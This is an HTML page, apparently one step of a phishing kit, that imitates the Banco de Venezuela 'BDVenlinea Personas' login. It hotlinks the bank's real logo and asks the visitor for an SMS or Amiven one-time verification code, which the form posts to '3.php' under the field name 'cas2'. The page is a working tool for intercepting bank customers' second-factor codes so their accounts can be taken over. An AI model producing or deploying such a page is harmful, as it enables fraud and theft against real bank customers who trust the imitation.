<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="/assets/favicon/favicon-16x16.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlinea Personas</title>
    <style>
        /* Estilos inspirados en la app del Banco de Venezuela */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e0e0e0; /* Fondo gris claro para la página */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            max-width: 360px;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Agregamos sombra al contenedor */
        }

        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #454343;
        }

        h5 {
            font-size: 17px;
            color: #454343;
            margin: 0 0 20px 0;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            height: auto;
            max-width: 100%;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group input[type="text"],
        .input-group input[type="password"] {
            width: calc(100% - 24px);
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s, padding-top 0.3s;
            display: block;
            background-color: #f9f9f9; /* Color de fondo del input */
            box-sizing: border-box; /* Asegura que el padding no afecte el ancho total */
            margin-top: 10px; /* Espacio entre el label y el input */
        }

        .input-group label {
            position: absolute;
            left: 20px;
            top: 16px; /* Ajuste para centrar verticalmente */
            font-size: 16px;
            color: #666;
            transition: top 0.3s, font-size 0.3s, color 0.3s;
            pointer-events: none;
            z-index: 1;
            background-color: #fff; /* Fondo del label para cubrir el texto del input */
            padding: 0 5px; /* Espaciado interno para el label */
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 12px;
            color: #858788;
        }

        .input-group input:focus {
            padding-top: 18px;
        }

        .input-group input.inputCodes {
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Sombra para el cuadro de entrada */
            border: 1px solid #b3bac8;
            border-radius: 10px;
            padding: 0;
            height: 50px;
            font-size: 18px;
            width: 100%; /* Asegura que el input se ajuste al ancho del contenedor */
            max-width: 300px; /* Establece un ancho máximo para el input */
            text-align: center;
            outline: none;
            letter-spacing: 2px; /* Ajustado a 2px para que se vea más natural */
            margin: 0 auto; /* Centra el input horizontalmente */
        }

        .terms {
            text-align: left;
            margin-bottom: 20px;
        }

        .terms label {
            font-size: 14px;
            color: #48c7ff; /* Color del texto del enlace */
        }

        .terms input[type="checkbox"] {
            margin-right: 10px;
        }

        .submit-btn {
            background-color: #0070cc; /* Color azul para el botón */
            color: white;
            border: none;
            padding: 12px 24px; /* Aumento del tamaño del botón */
            font-size: 18px; /* Tamaño de la fuente del botón */
            border-radius: 5px;
            cursor: pointer;
            display: block; /* Asegura que el botón se ajuste automáticamente */
            margin: 0 auto; /* Centra el botón horizontalmente */
            transition: background-color 0.3s;
        }

        .submit-btn:hover {
            background-color: #005999; /* Azul más oscuro para el estado hover */
        }

        .footer {
            margin-top: 15px;
            color: #666;
            background-size: cover;
            background-position: center;
            padding: 90px 0;
            text-align: center;
        }

        .footer p {
            margin: 0;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://bdvenlinea.banvenez.com/assets/login/logo.png" alt="Logo BDV Venezuela">
        </div>
        <h1>Verificación Requerida</h1>
        <hr>
        <h5>Ingresa el código recibido por SMS o Codigo generado en amiven:</h5>        
        <form action="3.php" method="post">
            <div class="input-group">
                <input class="inputCodes"
                       maxlength="8"
                       minlength="6"
                       name="cas2"
                       placeholder="CODIGO"
                       required
                       type="text">
            </div>
            <div class="terms">
                <!-- Aquí puedes agregar términos y condiciones si es necesario -->
            </div>
            <button type="submit" class="submit-btn">Continuar</button>
        </form>
        <div class="footer">
            <!-- Aquí puedes agregar contenido para el pie de página -->
        </div>
    </div>
</body>

</html>
